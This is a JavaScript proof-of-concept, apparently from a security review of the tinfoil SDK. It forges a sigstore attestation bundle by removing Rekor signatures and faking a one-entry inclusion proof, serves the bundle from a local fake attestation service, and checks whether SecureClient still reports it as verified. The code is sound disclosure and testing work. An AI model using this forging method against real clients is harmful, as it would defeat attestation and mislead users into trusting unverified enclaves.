// SDK-level PoC: a loopback "ATC" (attestation bundle service) serves the forged bundle whose tlog entry
// carries no Rekor signature. The public SecureClient API (tinfoil 1.2.2) reports securityVerified=true.
// Run with: NODE_EXTRA_CA_CERTS=<harness>/tls/cert.pem node poc/sdk-level-forged-atc.mjs
import https from 'node:https';
import fs from 'node:fs';
import { createHash } from 'node:crypto';
import { SecureClient } from '../dist/secure-client.js';

const tlsDir = '/root/tinfoil-review/work/js-sdk-verifier/harness/tls';
const fixture = JSON.parse(fs.readFileSync(new URL('../../verifier/test/fixtures/attestation-bundle.json', import.meta.url), 'utf8'));

// forge: strip every Rekor signature from the sigstore bundle, keep Fulcio cert + DSSE signature
const forged = structuredClone(fixture);
const e = forged.sigstoreBundle.verificationMaterial.tlogEntries[0];
delete e.inclusionPromise;
e.logId = { keyId: Buffer.alloc(32, 0x41).toString('base64') };
e.logIndex = '1';
e.integratedTime = '1769122000';
const body = Buffer.from(e.canonicalizedBody, 'base64');
e.inclusionProof = { logIndex: '0', rootHash: createHash('sha256').update(Buffer.concat([Buffer.from([0]), body])).digest('base64'), treeSize: '1', hashes: [] };
forged.releaseTag = 'v0.0.38';

let served = 0;
const server = https.createServer({ key: fs.readFileSync(`${tlsDir}/key.pem`), cert: fs.readFileSync(`${tlsDir}/cert.pem`) }, (req, res) => {
  served++;
  console.log(`[fake ATC] ${req.method} ${req.url} tinfoil-sdk=${req.headers['tinfoil-sdk']}/${req.headers['tinfoil-sdk-version']}`);
  if (req.url === '/attestation') { res.writeHead(200, { 'content-type': 'application/json' }); res.end(JSON.stringify(forged)); return; }
  res.writeHead(404); res.end();
});
await new Promise(r => server.listen(0, '127.0.0.1', r));
const port = server.address().port;

const client = new SecureClient({ attestationBundleURL: `https://localhost:${port}` });
try {
  await client.ready();
  const doc = client.getVerificationDocument();
  console.log('SecureClient.ready() resolved; securityVerified =', doc.securityVerified);
  console.log('steps =', JSON.stringify(doc.steps));
  console.log('releaseTag =', doc.releaseTag, 'codeMeasurement =', JSON.stringify(doc.codeMeasurement));
  console.log('enclaveHost =', doc.enclaveHost, 'hpkePublicKey =', doc.hpkePublicKey);
  console.log('baseURL =', client.getBaseURL());
} catch (err) {
  console.log('SecureClient.ready() rejected:', err.message, err.cause ? '/ ' + err.cause.message : '');
} finally {
  server.close();
}
console.log('fake ATC served', served, 'request(s)');
